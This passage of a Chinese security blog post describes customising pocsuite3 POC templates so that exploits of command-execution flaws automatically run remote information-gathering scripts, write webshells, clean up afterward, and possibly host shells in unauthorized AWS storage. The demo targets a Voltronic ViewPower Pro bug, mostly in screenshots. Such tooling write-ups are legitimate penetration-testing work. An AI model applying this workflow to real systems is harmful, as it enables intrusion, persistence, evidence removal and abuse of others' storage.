class="hljs-built_in">type</span>][<span class="hljs-string">&#x27;cryption&#x27;</span>]<br>    webshell[<span class="hljs-string">&#x27;content&#x27;</span>] = content<br>    webshell[<span class="hljs-string">&#x27;password&#x27;</span>] = password<br>    webshell[<span class="hljs-string">&#x27;key&#x27;</span>] = key<br>    <span class="hljs-keyword">return</span> webshell<br></code></pre></td></tr></table></figure>
+
+<h2 id="整合pocsuite模板"><a href="#整合pocsuite模板" class="headerlink" title="整合pocsuite模板"></a>整合pocsuite模板</h2><p><code>pocsutie -n</code> 的具体实现在 <code>pocsuite3/lib/core/template.py</code> 这里。</p>
+<p>其实现方式将 pocsuite 模板代码弄成这种列表：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107162649718.png" srcset="/img/loading.gif" lazyload alt="image-20240107162649718"></p>
+<p>生成列表代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">filename = <span class="hljs-string">r&quot;template.py&quot;</span><br>lines = []<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> index, line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(file):<br>        line = line.rstrip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        lines.append((index, <span class="hljs-built_in">repr</span>(line)))<br><br><span class="hljs-keyword">for</span> index, line <span class="hljs-keyword">in</span> lines:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;(<span class="hljs-subst">&#123;index&#125;</span>, <span class="hljs-subst">&#123;line&#125;</span>),&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>然后根据用户的输入去剔除不需要的部分：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107162740984.png" srcset="/img/loading.gif" lazyload alt="image-20240107162740984"></p>
+<p>剔除后直接写入文件就行了，比较简单。</p>
+<p>这里就简单过一下修改后的模板：</p>
+<ol>
+<li>输入信息</li>
+<li>根据漏洞类型判断其是文件读取还是能执行命令</li>
+<li>执行命令<ol>
+<li>有无回显<ol>
+<li>有回显 &#x3D;&gt; 通过 self.exec 去获取每个命令的执行结果</li>
+<li>无回显 &#x3D;&gt; 通过下载远程的 bat &#x2F; sh 文件去执行 将收集到的系统信息保存到静态文件目录下 然后在读取解析获取命令执行结果</li>
+</ol>
+</li>
+<li>写 webshell ?<ol>
+<li>通过 echo 写 &#x3D;&gt; 选择语言 &#x3D;&gt; 生成对应的马的内容 key password 传入到模板 &#x3D;&gt; self.exec 去写</li>
+<li>通过下载 &#x3D;&gt; 选择语言 &#x3D;&gt; 当前目录下生成一个对应的马的文件 &#x3D;&gt; 上传获取 URL （手动）&#x3D;&gt; 模板生成后修改下载的 url （ 待优化，自动上传到未授权的 aws 并返回 url 直接填入模板 ）</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="使用测试"><a href="#使用测试" class="headerlink" title="使用测试"></a>使用测试</h2><p>写一个 “Voltronic Power ViewPower Pro getMacAddressByIp 命令执行” 的 POC，这是一个无回显的洞（ 可以做成回显，不过这里用无回显测试 ）：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107173142204.png" srcset="/img/loading.gif" lazyload alt="image-20240107173142204"></p>
+<p>上传信息收集 bat 获取链接：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107173428126.png" srcset="/img/loading.gif" lazyload alt="image-20240107173428126"></p>
+<p>填一下链接和保存的文件名，这里搭的是 windows ，保存为 .bat 后执行即可：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107181136283.png" srcset="/img/loading.gif" lazyload alt="image-20240107181136283"></p>
+<p>写一下 <code>check()</code> 和 <code>exec()</code> 函数：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107174102277.png" srcset="/img/loading.gif" lazyload alt="image-20240107174102277"></p>
+<p>执行：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107181420694.png" srcset="/img/loading.gif" lazyload alt="image-20240107181420694"></p>
+<p>在信息收集完成之后其实可以执行一下清除的命令，比如：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107181745322.png" srcset="/img/loading.gif" lazyload alt="image-20240107181745322"></p>
+<p>填一下 webshell 的上传路径和请求路径：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107182103182.png" srcset="/img/loading.gif" lazyload alt="image-20240107182103182"></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107183215894.png" srcset="/img/loading.gif" lazyload alt="image-20240107183215894"></p>
+<img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107183234173.png" srcset="/img/loading.gif" lazyload alt="image-20240107183234173" style="zoom:67%;" />
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>改完写命令执行、文件读取之类的 POC 就轻松一些，只需要关注漏洞如何利用，及下载保存的文件名、webshell 写入路径即可。不需要再向之前的复制粘贴再改改。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" class="category-chain-item">安全开发</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/">#源码学习</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pocsuite 模板修改</div>
+      <div>https://fuyoumingyan.github.io/2024/01/07/安全开发/pocsuite 模板修改/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>fuming</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/30/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/gofinger%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7-v0-9/" title="gofinger指纹识别工具-v0.95">
+                        <span class="hidden-mobile">gofinger指纹识别工具-v0.95</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
